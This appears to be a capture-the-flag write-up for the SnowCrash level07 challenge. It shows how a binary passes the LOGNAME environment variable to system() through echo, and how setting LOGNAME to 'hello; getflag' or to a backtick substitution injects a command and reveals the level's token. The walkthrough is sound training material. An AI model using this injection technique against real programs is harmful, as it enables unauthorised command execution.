1. **File Search**

    Running the program only shows the output `level07`, nothing interesting here, but if we look with `strings` we find some things:
    ```bash
    strings level07
    [...]
    getenv
    LOGNAME
    /bin/echo %s
    system
    [...]
    ```
    1. Use of environment variables and system()
        - `getenv`, `LOGNAME`, and `/bin/echo %s` appear, suggesting that the binary reads the `LOGNAME` environment variable and passes it to an `echo` command using `system()`.
    2. Dangerous functions
        - `system`, `asprintf`, `getenv` are used, which is often a vulnerability vector if the user controls the content of the environment variable.
    3. Source code path
        - `/home/user/level07/level07.c` appears, indicating that the binary is not obfuscated and you can probably find the source code or deduce its logic.
    4. Suspicious string
        - `zE&9qU` could be a password, flag, or relevant data.

    The binary probably executes something like:
    ```bash
    system("/bin/echo $LOGNAME");
    ```

2. **Exploitation**

    If we can modify the environment variable, we could inject commands:
    ```bash
    level07@SnowCrash:~$ LOGNAME='hello; getflag' ./level07
    hello
    Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
    ```

export LOGNAME=\`getflag\`
